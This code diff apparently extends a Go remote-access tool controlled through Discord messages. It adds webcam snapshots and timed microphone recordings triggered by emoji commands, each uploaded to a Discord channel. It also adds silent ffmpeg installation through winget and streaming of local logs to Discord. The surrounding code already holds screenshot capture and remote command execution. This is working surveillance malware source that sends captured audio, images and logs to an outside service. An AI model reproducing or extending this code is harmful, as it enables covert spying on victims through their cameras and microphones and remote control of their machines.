@@ -4,24 +4,208 @@ import (
 	"fmt"
 	"image/png"
 	"io"
+	"log"
 	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"runtime"
 	"strings"
+	"sync"
 	"syscall"
+	"time"
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/kbinani/screenshot"
 )
 
 func getTmpDir() string {
-	if runtime.GOOS == "windows" {
-		return "C:\\Windows\\Tasks\\"
-	} else {
-		return "/tmp/"
+	dir := os.TempDir()
+	if !strings.HasSuffix(dir, string(os.PathSeparator)) {
+		dir += string(os.PathSeparator)
 	}
+	return dir
+}
+
+type discordLogWriter struct {
+	base io.Writer
+}
+
+var (
+	logStreamEnabled   bool
+	logStreamSession   *discordgo.Session
+	logStreamChannelID string
+	logStreamMutex     sync.Mutex
+)
+
+func (w *discordLogWriter) Write(p []byte) (int, error) {
+	n, err := w.base.Write(p)
+	msg := strings.TrimSpace(string(p))
+	if msg == "" {
+		return n, err
+	}
+	logStreamMutex.Lock()
+	enabled := logStreamEnabled
+	s := logStreamSession
+	ch := logStreamChannelID
+	logStreamMutex.Unlock()
+	if enabled && s != nil && ch != "" {
+		if len(msg) > 1800 {
+			msg = msg[:1800]
+		}
+		content := "```log\n" + msg + "\n```"
+		go s.ChannelMessageSend(ch, content)
+	}
+	return n, err
+}
+
+func enableLogStreaming(s *discordgo.Session, channelID string) {
+	logStreamMutex.Lock()
+	logStreamEnabled = true
+	logStreamSession = s
+	logStreamChannelID = channelID
+	logStreamMutex.Unlock()
+}
+
+func disableLogStreaming() {
+	logStreamMutex.Lock()
+	logStreamEnabled = false
+	logStreamSession = nil
+	logStreamChannelID = ""
+	logStreamMutex.Unlock()
+}
+
+func ensureFFmpegAvailable(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) bool {
+	if _, err := exec.LookPath("ffmpeg"); err == nil {
+		return true
+	}
+	log.Printf("FFMPEG not found in PATH")
+	if runtime.GOOS != "windows" {
+		if s != nil {
+			s.ChannelMessageSendReply(channelID, "ffmpeg is required but not found in PATH.", ref)
+		}
+		return false
+	}
+	if s != nil {
+		s.ChannelMessageSendReply(channelID, "ffmpeg not found. Attempting installation via winget on Windows...", ref)
+	}
+	wingetPath, err := exec.LookPath("winget")
+	if err != nil {
+		log.Printf("winget not found in PATH: %v", err)
+		if s != nil {
+			s.ChannelMessageSendReply(channelID, "winget is not available. Please install ffmpeg manually and ensure it is in PATH.", ref)
+		}
+		return false
+	}
+	log.Printf("Using winget at %s to install ffmpeg", wingetPath)
+	cmd := exec.Command(wingetPath,
+		"install",
+		"--id=Gyan.FFmpeg",
+		"-e",
+		"--source=winget",
+		"--accept-package-agreements",
+		"--accept-source-agreements",
+		"--silent",
+	)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		log.Printf("winget ffmpeg install error: %v, output=%s", err, string(out))
+		if s != nil {
+			s.ChannelMessageSendReply(channelID, "ffmpeg installation via winget failed. Please install ffmpeg manually and ensure it is in PATH.", ref)
+		}
+		return false
+	}
+	log.Printf("winget ffmpeg install output: %s", string(out))
+	if _, err := exec.LookPath("ffmpeg"); err == nil {
+		log.Printf("FFMPEG available after winget install")
+		return true
+	}
+	commonPaths := []string{
+		`C:\Program Files\ffmpeg\bin`,
+		`C:\Program Files (x86)\ffmpeg\bin`,
+	}
+	for _, p := range commonPaths {
+		if fi, err := os.Stat(p); err == nil && fi.IsDir() {
+			pathEnv := os.Getenv("PATH")
+			if !strings.Contains(pathEnv, p) {
+				newPath := p + ";" + pathEnv
+				os.Setenv("PATH", newPath)
+				log.Printf("Added %s to PATH for current process", p)
+			}
+			if _, err := exec.LookPath("ffmpeg"); err == nil {
+				log.Printf("FFMPEG found after adding %s to PATH", p)
+				return true
+			}
+		}
+	}
+	if s != nil {
+		s.ChannelMessageSendReply(channelID, "ffmpeg installation attempted but binary is still not accessible. You may need to restart or adjust PATH manually.", ref)
+	}
+	return false
+}
+
+func detectWindowsDShowDevice(kind string) string {
+	_, err := exec.LookPath("ffmpeg")
+	if err != nil {
+		log.Printf("DShow detect: ffmpeg not found in PATH: %v", err)
+		return ""
+	}
+	out, err := exec.Command("ffmpeg", "-list_devices", "true", "-f", "dshow", "-i", "dummy").CombinedOutput()
+	if err != nil {
+		log.Printf("DShow detect: ffmpeg list_devices error: %v, output=%s", err, string(out))
+		return ""
+	}
+	lines := strings.Split(string(out), "\n")
+	header := "DirectShow " + kind + " devices"
+	found := false
+	var candidate string
+	for _, raw := range lines {
+		line := strings.TrimSpace(raw)
+		if strings.Contains(line, header) {
+			found = true
+			continue
+		}
+		if strings.Contains(line, "\"") {
+			start := strings.Index(line, "\"")
+			end := strings.LastIndex(line, "\"")
+			if start >= 0 && end > start {
+				name := line[start+1 : end]
+				if name == "" {
+					continue
+				}
+				if kind == "audio" && !strings.Contains(line, "(audio)") && !strings.Contains(line, "DirectShow audio devices") {
+					continue
+				}
+				if kind == "video" && !strings.Contains(line, "(video)") && !strings.Contains(line, "DirectShow video devices") {
+					continue
+				}
+				device := kind + "=" + name
+				if kind == "video" && strings.Contains(name, "Virtual Camera") {
+					if candidate == "" {
+						candidate = device
+					}
+					continue
+				}
+				if kind == "audio" && strings.Contains(name, "Stereo Mix") {
+					if candidate == "" {
+						candidate = device
+					}
+					continue
+				}
+				log.Printf("DShow detect: selected %s device %s", kind, device)
+				return device
+			}
+		}
+		if !found {
+			continue
+		}
+	}
+	if candidate != "" {
+		log.Printf("DShow detect: using fallback %s device %s", kind, candidate)
+		return candidate
+	}
+	log.Printf("DShow detect: no %s device found", kind)
+	return ""
 }
 
 func handleScreenshot(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
@@ -41,6 +225,166 @@ func handleScreenshot(s *discordgo.Session, channelID string, ref *discordgo.Mes
 		fileArray := []*discordgo.File{fileStruct}
 		s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
 	}
+}
+
+func handleCameraSnapshot(s *discordgo.Session, channelID string, ref *discordgo.MessageReference) {
+	fileName := fmt.Sprintf("%scam_%d.jpg", getTmpDir(), time.Now().UnixNano())
+	var cmd *exec.Cmd
+	device := os.Getenv("DC2_CAMERA_DEVICE")
+	switch runtime.GOOS {
+	case "windows":
+		if device == "" {
+			detected := detectWindowsDShowDevice("video")
+			if detected != "" {
+				device = detected
+			} else {
+				log.Printf("CAMERA no Windows video device detected; DC2_CAMERA_DEVICE not set")
+				s.ChannelMessageSendReply(channelID, "No Windows camera device detected. Set DC2_CAMERA_DEVICE to a valid DirectShow video device name (list devices via: ffmpeg -list_devices true -f dshow -i dummy).", ref)
+				return
+			}
+		}
+		log.Printf("CAMERA windows device=%s", device)
+		if !ensureFFmpegAvailable(s, channelID, ref) {
+			log.Printf("CAMERA ffmpeg unavailable on Windows")
+			return
+		}
+		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", device, "-vframes", "1", fileName)
+	default:
+		log.Printf("CAMERA feature not implemented for OS: %s", runtime.GOOS)
+		s.ChannelMessageSendReply(channelID, "Camera feature does not exist yet for this OS (Windows only).", ref)
+		return
+	}
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		msg := "Camera capture failed"
+		if runtime.GOOS == "windows" {
+			msg = msg + " (ensure ffmpeg is installed; set DC2_CAMERA_DEVICE to a valid DirectShow video device, list devices via: ffmpeg -list_devices true -f dshow -i dummy)"
+		}
+		if len(out) > 0 {
+			if len(out) > 300 {
+				out = out[:300]
+			}
+			msg = msg + ": " + string(out)
+		} else {
+			msg = msg + ": " + err.Error()
+		}
+		s.ChannelMessageSendReply(channelID, msg, ref)
+		return
+	}
+	f, err := os.Open(fileName)
+	if err != nil {
+		s.ChannelMessageSendReply(channelID, "Cannot open captured file: "+err.Error(), ref)
+		return
+	}
+	defer f.Close()
+	fileStruct := &discordgo.File{Name: filepath.Base(fileName), Reader: f}
+	fileArray := []*discordgo.File{fileStruct}
+	s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{Files: fileArray, Reference: ref})
+}
+
+func handleMicRecord(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, seconds int, destPath string) {
+	log.Printf("MIC start: channel=%s seconds=%d destPath=%s os=%s", channelID, seconds, destPath, runtime.GOOS)
+	if seconds <= 0 {
+		seconds = 10
+	}
+	if seconds > 300 {
+		seconds = 300
+	}
+	log.Printf("MIC normalized duration: %d seconds", seconds)
+	path := destPath
+	if path == "" {
+		path = fmt.Sprintf("%smic_%d.m4a", getTmpDir(), time.Now().UnixNano())
+	} else {
+		ext := strings.ToLower(filepath.Ext(path))
+		valid := ext == ".m4a" || ext == ".aac" || ext == ".mp3" || ext == ".wav" || ext == ".flac" || ext == ".ogg" || ext == ".opus" || ext == ".wma"
+		if !valid {
+			log.Printf("MIC non-audio extension %q requested, appending .m4a", ext)
+			path = path + ".m4a"
+		}
+	}
+	log.Printf("MIC resolved path: %s", path)
+	durArg := fmt.Sprintf("%d", seconds)
+	var cmd *exec.Cmd
+	device := os.Getenv("DC2_MIC_DEVICE")
+	switch runtime.GOOS {
+	case "windows":
+		if device == "" {
+			detected := detectWindowsDShowDevice("audio")
+			if detected != "" {
+				device = detected
+			} else {
+				log.Printf("MIC no Windows audio device detected; DC2_MIC_DEVICE not set")
+				s.ChannelMessageSendReply(channelID, "No Windows microphone device detected. Set DC2_MIC_DEVICE to a valid DirectShow audio device name (list devices via: ffmpeg -list_devices true -f dshow -i dummy).", ref)
+				return
+			}
+		}
+		log.Printf("MIC ffmpeg windows device=%s", device)
+		if !ensureFFmpegAvailable(s, channelID, ref) {
+			log.Printf("MIC ffmpeg unavailable on Windows")
+			return
+		}
+		cmd = exec.Command("ffmpeg", "-y", "-f", "dshow", "-i", device, "-t", durArg, "-ac", "1", "-ar", "16000", "-b:a", "64k", path)
+	default:
+		log.Printf("MIC feature not implemented for OS: %s", runtime.GOOS)
+		s.ChannelMessageSendReply(channelID, "Microphone recording feature does not exist yet for this OS (Windows only).", ref)
+		return
+	}
+	log.Printf("MIC running ffmpeg: %v", cmd.Args)
+	out, err := cmd.CombinedOutput()
+	if err != nil {
+		msg := "Microphone recording failed"
+		log.Printf("MIC ffmpeg error: %v", err)
+		if len(out) > 0 {
+			log.Printf("MIC ffmpeg stderr: %s", string(out))
+			if len(out) > 300 {
+				out = out[:300]
+			}
+			msg = msg + ": " + string(out)
+		} else {
+			msg = msg + ": " + err.Error()
+		}
+		s.ChannelMessageSendReply(channelID, msg, ref)
+		return
+	}
+	log.Printf("MIC ffmpeg completed successfully for %s", path)
+	fi, err := os.Stat(path)
+	if err != nil {
+		log.Printf("MIC stat error for %s: %v", path, err)
+		s.ChannelMessageSendReply(channelID, "Cannot stat recorded file: "+err.Error(), ref)
+		return
+	}
+	log.Printf("MIC recorded file size: %d bytes", fi.Size())
+	if fi.Size() == 0 {
+		log.Printf("MIC zero-byte file at %s", path)
+		s.ChannelMessageSendReply(channelID, "Recorded file is empty (0 bytes). Check microphone and ffmpeg settings.", ref)
+		return
+	}
+	if fi.Size() >= 8388608 {
+		log.Printf("MIC file too large to upload: size=%d", fi.Size())
+		s.ChannelMessageSendReply(channelID, fmt.Sprintf("Recorded %d seconds to %s (file too large to upload, size=%d bytes).", seconds, path, fi.Size()), ref)
+		return
+	}
+	f, err := os.Open(path)
+	if err != nil {
+		log.Printf("MIC open error for %s: %v", path, err)
+		s.ChannelMessageSendReply(channelID, "Cannot open recorded file: "+err.Error(), ref)
+		return
+	}
+	defer f.Close()
+	fileStruct := &discordgo.File{Name: filepath.Base(path), Reader: f}
+	fileArray := []*discordgo.File{fileStruct}
+	log.Printf("MIC sending file %s to channel=%s", path, channelID)
+	_, sendErr := s.ChannelMessageSendComplex(channelID, &discordgo.MessageSend{
+		Content:   fmt.Sprintf("Recorded %d seconds to %s", seconds, path),
+		Files:     fileArray,
+		Reference: ref,
+	})
+	if sendErr != nil {
+		log.Printf("MIC discord send error for %s: %v", path, sendErr)
+		s.ChannelMessageSendReply(channelID, "Upload failed: "+sendErr.Error(), ref)
+		return
+	}
+	log.Printf("MIC send completed for channel=%s path=%s", channelID, path)
 }
 
 func runCommandString(s *discordgo.Session, channelID string, ref *discordgo.MessageReference, cmdStr string) {
@@ -188,7 +532,16 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		})
 		flag = 1
 	} else if m.Content == "📸" {
+		log.Printf("SCREENSHOT emoji trigger: channel=%s", m.ChannelID)
 		handleScreenshot(s, m.ChannelID, m.Reference())
+		flag = 1
+	} else if m.Content == "🎙" {
+		log.Printf("MIC emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
+		handleMicRecord(s, m.ChannelID, m.Reference(), 10, "")
+		flag = 1
+	} else if m.Content == "📷" {
+		log.Printf("CAMERA emoji trigger: channel=%s user=%s", m.ChannelID, m.Author.ID)
+		handleCameraSnapshot(s, m.ChannelID, m.Reference())
 		flag = 1
 	} else if strings.HasPrefix(m.Content, "👇") {
 		parts := strings.Fields(m.Content)
